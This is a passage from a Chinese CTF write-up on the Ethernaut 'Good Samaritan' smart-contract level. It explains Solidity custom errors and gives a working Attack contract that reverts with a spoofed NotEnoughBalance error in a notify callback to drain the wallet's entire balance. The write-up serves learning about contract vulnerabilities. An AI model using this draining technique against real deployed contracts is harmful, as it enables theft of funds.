class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">根据下面合约代码，告诉我如何把钱包里的余额全部取出</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/utils/Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract GoodSamaritan &#123;</span><br><span class="line">    Wallet public wallet;</span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        wallet = new Wallet();</span><br><span class="line">        coin = new Coin(address(wallet));</span><br><span class="line"></span><br><span class="line">        wallet.setCoin(coin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function requestDonation() external returns(bool enoughBalance)&#123;</span><br><span class="line">        // donate 10 coins to requester</span><br><span class="line">        try wallet.donate10(msg.sender) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (bytes memory err) &#123;</span><br><span class="line">            if (keccak256(abi.encodeWithSignature(&quot;NotEnoughBalance()&quot;)) == keccak256(err)) &#123;</span><br><span class="line">                // send the coins left</span><br><span class="line">                wallet.transferRemainder(msg.sender);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Coin &#123;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    error InsufficientBalance(uint256 current, uint256 required);</span><br><span class="line"></span><br><span class="line">    constructor(address wallet_) &#123;</span><br><span class="line">        // one million coins for Good Samaritan initially</span><br><span class="line">        balances[wallet_] = 10**6;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address dest_, uint256 amount_) external &#123;</span><br><span class="line">        uint256 currentBalance = balances[msg.sender];</span><br><span class="line"></span><br><span class="line">        // transfer only occurs if balance is enough</span><br><span class="line">        if(amount_ &lt;= currentBalance) &#123;</span><br><span class="line">            balances[msg.sender] -= amount_;</span><br><span class="line">            balances[dest_] += amount_;</span><br><span class="line"></span><br><span class="line">            if(dest_.isContract()) &#123;</span><br><span class="line">                // notify contract </span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert InsufficientBalance(currentBalance, amount_);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    // The owner of the wallet instance</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    Coin public coin;</span><br><span class="line"></span><br><span class="line">    error OnlyOwner();</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        if(msg.sender != owner) &#123;</span><br><span class="line">            revert OnlyOwner();</span><br><span class="line">        &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate10(address dest_) external onlyOwner &#123;</span><br><span class="line">        // check balance left</span><br><span class="line">        if (coin.balances(address(this)) &lt; 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // donate 10 coins</span><br><span class="line">            coin.transfer(dest_, 10);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferRemainder(address dest_) external onlyOwner &#123;</span><br><span class="line">        // transfer balance left</span><br><span class="line">        coin.transfer(dest_, coin.balances(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCoin(Coin coin_) external onlyOwner &#123;</span><br><span class="line">        coin = coin_;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要求把钱包里的余额全部取出</p>
<p>提示：<a target="_blank" rel="noopener" href="https://blog.soliditylang.org/2021/04/21/custom-errors/">https://blog.soliditylang.org/2021/04/21/custom-errors/</a></p>
<h2 id="custom-errors"><a href="#custom-errors" class="headerlink" title="custom errors"></a>custom errors</h2><p>从solidity v0.8.4开始，通过自定义错误，提供了一种方便且节省gas的方式向用户解释操作失败的原因。截至目前，可以使用字符串来提供关于失败的更多信息（例如<code>revert(&quot;Insufficient funds.&quot;);</code>），但它们的开销很大，特别是涉及到部署成本时，而且很难在其中使用动态信息</p>
<p>使用error语句自定义错误，该语句可以在合约（包括接口和库）的内部和外部使用</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>本题比较简单，发现使用了try catch，如果执行<code>revert NotEnoughBalance()</code>回滚，则会调用<code>wallet.transferRemainder(msg.sender);</code>一次性将剩下的钱都转走。所以考虑通过某种方法调用自定义的<code>NotEnoughBalance</code>错误。</p>
<p>发现在调用链中会调用下面语句，其中<code>notify</code>是一个接口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(dest_.isContract()) &#123;</span><br><span class="line">                // notify contract </span><br><span class="line">                INotifyable(dest_).notify(amount_);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
<p>所以可以考虑编写合约，合约继承<code>INotifyable</code>并实现<code>notify</code>方法。但是经过尝试如果方法中只是<code>revert NotEnoughBalance()</code>，则在第二次transferRemainder时会再次调用<code>revert NotEnoughBalance()</code>，造成报错。</p>
<p>注意到<code>notify</code>方法有参数<code>amount</code>，即转账的数额，所以实际上第一次尝试转账是这里是10，第二次转账走的是transferreminder将是<code>10**6-10</code>，所以通过这里判断即可，第一次调用<code>revert</code>，第二次不做操作即可。</p>
<p>有一个点一开始没注意到是如果触发<code>revert</code>，这之前进行的操作都会回滚取消，所以这一路的变量修改什么的都将是无效的。</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack is INotifyable&#123;</span><br><span class="line">    </span><br><span class="line">    GoodSamaritan public g;</span><br><span class="line">    error NotEnoughBalance();</span><br><span class="line">    </span><br><span class="line">    constructor (address goodman_address) &#123;</span><br><span class="line">        g = GoodSamaritan(goodman_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function notify(uint256 amount) external override &#123;</span><br><span class="line">        if (amount&lt;=10)&#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        g.requestDonation();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://solidity-cn.readthedocs.io/zh/develop/solidity-by-example.html">https://solidity-cn.readthedocs.io/zh/develop/solidity-by-example.html</a><br><a target="_blank" rel="noopener" href="https://zpano.gitee.io/2021/06/17/16/">https://zpano.gitee.io/2021/06/17/16/</a><br><a target="_blank" rel="noopener" href="https://zpano.gitee.io/2021/06/27/17/">https://zpano.gitee.io/2021/06/27/17/</a><br><a target="_blank" rel="noopener" href="https://0xsage.medium.com/">https://0xsage.medium.com/</a><br><a target="_blank" rel="noopener" href="https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet">https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet</a><br>……<br>……</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">aYoung</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://iamayoung.xyz/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/">https://iamayoung.xyz/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://iamayoung.xyz" target="_blank">aYoung's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/wp/">wp</a><a class="post-meta__tags" href="/tags/blockchain/">blockchain</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2022/11/18/zn2XIe.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/09/21/%E3%80%90WP%E3%80%91%E8%93%9D%E5%B8%BD%E6%9D%AF2022-final/"><img class="prev-cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">【WP】蓝帽杯2022_final</div></div></a></div><div class="next-post pull-right"><a href="/2022/08/26/%E3%80%90WP%E3%80%91qwb2022-final-rdp/"><img class="next-cover" src="https://s1.ax1x.com/2022/08/27/vR8Hv6.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">【WP】qwb2022_final_rdp</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/01/20/【WP】2021SCTF复现/" title="【WP】2021SCTF复现"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-20</div><div class="title">【WP】2021SCTF复现</div></div></a></div><div><a href="/2022/01/24/【WP】2022hws线上预选pwn题/" title="【WP】2022hws线上预选pwn题"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-24</div><div class="title">【WP】2022hws线上预选pwn题</div></div></a></div><div><a href="/2022/04/10/【WP】2022车联网/" title="【WP】2022车联网"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-10</div><div class="title">【WP】2022车联网</div></div></a></div><div><a href="/2022/04/07/【WP】2022midnightctf-部分pwn复现学习/" title="【WP】2022midnightctf_部分pwn复现学习"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-07</div><div class="title">【WP】2022midnightctf_部分pwn复现学习</div></div></a></div><div><a href="/2021/05/13/【WP】CSTC2021-Pwn/" title="【WP】CSTC2021-Pwn"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-13</div><div class="title">【WP】CSTC2021-Pwn</div></div></a></div><div><a href="/2021/01/08/【WP】BUUCTF之not_the_same_3dsctf_2016/" title="【WP】BUUCTF之not_the_same_3dsctf_2016"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/01/c580c803fd53c030.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-08</div><div class="title">【WP】BUUCTF之not_the_same_3dsctf_2016</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://s4.ax1x.com/2022/01/14/731OZF.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">aYoung</div><div class="author-info__description">aYoung的博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">83</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aYoung-CS"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/aYoung-CS" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hello-Ethernaut"><span class="toc-number">1.</span> <span class="toc-text">Hello Ethernaut</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallback"><span class="toc-number">2.</span> <span class="toc-text">Fallback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Fallout"><span class="toc-number">3.</span> <span class="toc-text">Fallout</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coin-Flip"><span class="toc-number">4.</span> <span class="toc-text">Coin Flip</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Telephone"><span class="toc-number">5.</span> <span class="toc-text">Telephone</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Token"><span class="toc-number">6.</span> <span class="toc-text">Token</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Delegation"><span class="toc-number">7.</span> <span class="toc-text">Delegation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Force"><span class="toc-number">8.</span> <span class="toc-text">Force</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vault"><span class="toc-number">9.</span> <span class="toc-text">Vault</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#King"><span class="toc-number">10.</span> <span class="toc-text">King</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re-entrancy"><span class="toc-number">11.</span> <span class="toc-text">Re-entrancy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Elevator"><span class="toc-number">12.</span> <span class="toc-text">Elevator</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Privacy"><span class="toc-number">13.</span> <span class="toc-text">Privacy</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeper-One"><span class="toc-number">14.</span> <span class="toc-text">Gatekeeper One</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gatekeeper-Two"><span class="toc-number">15.</span> <span class="toc-text">Gatekeeper Two</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Naught-Coin"><span class="toc-number">16.</span> <span class="toc-text">Naught Coin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Preservation"><span class="toc-number">17.</span> <span class="toc-text">Preservation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Recovery"><span class="toc-number">18.</span> <span class="toc-text">Recovery</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MagicNumber"><span class="toc-number">19.</span> <span class="toc-text">MagicNumber</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Alien-Codex"><span class="toc-number">20.</span> <span class="toc-text">Alien Codex</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Denial"><span class="toc-number">21.</span> <span class="toc-text">Denial</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shop"><span class="toc-number">22.</span> <span class="toc-text">Shop</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E4%B8%AA%E5%B0%8F%E6%8F%92%E6%9B%B2"><span class="toc-number">23.</span> <span class="toc-text">1个小插曲</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dex"><span class="toc-number">24.</span> <span class="toc-text">Dex</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Dex-Two"><span class="toc-number">25.</span> <span class="toc-text">Dex Two</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Puzzle-Wallet"><span class="toc-number">26.</span> <span class="toc-text">Puzzle Wallet</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Motorbike"><span class="toc-number">27.</span> <span class="toc-text">Motorbike</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DoubleEntryPoint"><span class="toc-number">28.</span> <span class="toc-text">DoubleEntryPoint</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">28.1.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%88%E7%BA%A6%E7%90%86%E8%A7%A3"><span class="toc-number">28.2.</span> <span class="toc-text">合约理解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LegacyToken"><span class="toc-number">28.2.1.</span> <span class="toc-text">LegacyToken</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DoubleEntryPoint-1"><span class="toc-number">28.2.2.</span> <span class="toc-text">DoubleEntryPoint</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fortaNotify-%E4%BF%AE%E9%A5%B0%E7%AC%A6"><span class="toc-number">28.2.3.</span> <span class="toc-text">fortaNotify 修饰符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delegateTransfer-%E5%87%BD%E6%95%B0"><span class="toc-number">28.2.4.</span> <span class="toc-text">delegateTransfer 函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CryptoVault"><span class="toc-number">28.2.5.</span> <span class="toc-text">CryptoVault</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">28.3.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4"><span class="toc-number">28.4.</span> <span class="toc-text">防护</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">28.5.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Good-Samaritan"><span class="toc-number">29.</span> <span class="toc-text">Good Samaritan</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#custom-errors"><span class="toc-number">29.1.</span> <span class="toc-text">custom errors</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">29.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">29.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">30.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/dirtypipe-CVE-2022-0847-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="dirtypipe(CVE-2022-0847)漏洞复现"><img src="https://s1.ax1x.com/2022/11/18/zn2XIe.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="dirtypipe(CVE-2022-0847)漏洞复现"/></a><div class="content"><a class="title" href="/2023/02/12/dirtypipe-CVE-2022-0847-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="dirtypipe(CVE-2022-0847)漏洞复现">dirtypipe(CVE-2022-0847)漏洞复现</a><time datetime="2023-02-12T11:26:46.000Z" title="发表于 2023-02-12 19:26:46">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/qemu%E6%90%AD%E5%BB%BAlinux%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83/" title="Qemu搭建linux内核环境"><img src="https://s1.ax1x.com/2022/11/18/zn2XIe.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Qemu搭建linux内核环境"/></a><div class="content"><a class="title" href="/2023/02/12/qemu%E6%90%AD%E5%BB%BAlinux%E5%86%85%E6%A0%B8%E7%8E%AF%E5%A2%83/" title="Qemu搭建linux内核环境">Qemu搭建linux内核环境</a><time datetime="2023-02-12T11:24:50.000Z" title="发表于 2023-02-12 19:24:50">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/03/%E3%80%90WP%E3%80%91geekgame%E5%AD%A6%E4%B9%A0/" title="【WP】geekgame学习"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】geekgame学习"/></a><div class="content"><a class="title" href="/2023/01/03/%E3%80%90WP%E3%80%91geekgame%E5%AD%A6%E4%B9%A0/" title="【WP】geekgame学习">【WP】geekgame学习</a><time datetime="2023-01-03T15:17:24.000Z" title="发表于 2023-01-03 23:17:24">2023-01-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/21/%E3%80%90WP%E3%80%91%E8%93%9D%E5%B8%BD%E6%9D%AF2022-final/" title="【WP】蓝帽杯2022_final"><img src="https://ftp.bmp.ovh/imgs/2021/02/ec5ef65c96792f29.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】蓝帽杯2022_final"/></a><div class="content"><a class="title" href="/2022/09/21/%E3%80%90WP%E3%80%91%E8%93%9D%E5%B8%BD%E6%9D%AF2022-final/" title="【WP】蓝帽杯2022_final">【WP】蓝帽杯2022_final</a><time datetime="2022-09-21T12:27:44.000Z" title="发表于 2022-09-21 20:27:44">2022-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/" title="【WP】Ethernaut"><img src="https://s1.ax1x.com/2022/11/18/zn2XIe.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【WP】Ethernaut"/></a><div class="content"><a class="title" href="/2022/09/07/%E3%80%90WP%E3%80%91Ethernaut/" title="【WP】Ethernaut">【WP】Ethernaut</a><time datetime="2022-09-07T06:46:53.000Z" title="发表于 2022-09-07 14:46:53">2022-09-07</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By aYoung</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>function loadValine () {
  function initValine () {
    let initData = {
      el: '#vcomment',
      appId: 'L7cFgIQhurvmmSexryctex39-MdYXbMMI',
      appKey: 'EG1BbRP3FTdnTfn0QeeeIDii',
      placeholder: 'Please leave your footprints',
      avatar: 'robohash',
      meta: 'nick/mail/link'.split(','),
      pageSize: '10',
      avatar_cdn: 'https://www.gravatar.com/avatar/',
      lang: 'zh-CN',
      recordIP: true,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: true,
      path: window.location.pathname,
    }

    if (true) { 
      initData.requiredFields= ('nick/mail'.split(','))
    }
    
    if (false) {
      const otherData = false
      initData = Object.assign(initData, otherData)
    }
    
    const valine = new Valine(initData)
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>